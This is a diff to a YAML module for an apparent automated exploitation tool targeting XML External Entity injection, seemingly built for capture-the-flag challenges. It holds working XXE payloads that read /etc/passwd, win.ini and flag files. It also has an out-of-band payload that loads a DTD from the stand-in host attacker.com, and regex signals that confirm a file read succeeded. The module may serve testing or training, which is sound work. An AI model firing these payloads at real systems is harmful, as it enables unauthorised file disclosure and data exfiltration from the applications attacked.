@@ -4,12 +4,19 @@
 id: web_xxe
 name: XML External Entity Injection
 category: web
-version: "1.0"
+version: "1.1"
 author: system
 description: >
   Detects and exploits XXE vulnerabilities in XML parsers. Targets applications
   that parse XML input without disabling external entity processing, enabling
   file disclosure, SSRF, and out-of-band data exfiltration.
+
+tags:
+  - xxe
+  - xml
+  - dtd
+  - oob
+estimated_duration_seconds: 25
 
 # ============================================================
 # Guard
@@ -56,8 +63,10 @@ detection_paths:
           payloads:
             - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>'
             - '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>'
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
         signals:
-          - match: 'root:.*:/bin/|localhost'
+          - match:
+              condition: "response.status in [200, 400, 500] and re.search(r'root:.*:/bin/|localhost|\\[fonts\\]|for 16-bit app support', response.body, re.I)"
             on_match:
               confidence_boost: 0.50
               emit: xxe_file_read_confirmed
@@ -75,7 +84,8 @@ detection_paths:
           payloads:
             - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>'
         signals:
-          - match: 'No such file|cannot be resolved|entity|DTD|DOCTYPE'
+          - match:
+              condition: "response.status in [400, 500] and re.search(r'No such file|cannot be resolved|entity|DTD|DOCTYPE|external entity', response.body, re.I)"
             on_match:
               confidence_boost: 0.35
               emit: xxe_error_confirmed
@@ -93,7 +103,8 @@ detection_paths:
           payloads:
             - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>test</foo>'
         signals:
-          - match: 'callback|received|dns'
+          - match:
+              condition: "response.status in [200, 400, 500] and re.search(r'callback|received|dns|resolver|fetch', response.body, re.I)"
             on_match:
               confidence_boost: 0.40
               emit: xxe_oob_confirmed
@@ -117,6 +128,7 @@ exploitation_paths:
             - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]><foo>&xxe;</foo>'
             - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/flag.txt">]><foo>&xxe;</foo>'
             - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/flag.txt">]><foo>&xxe;</foo>'
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/flag.txt">]><foo>&xxe;</foo>'
         capture:
           - pattern: 'flag\{[^}]+\}'
             as: flag_value
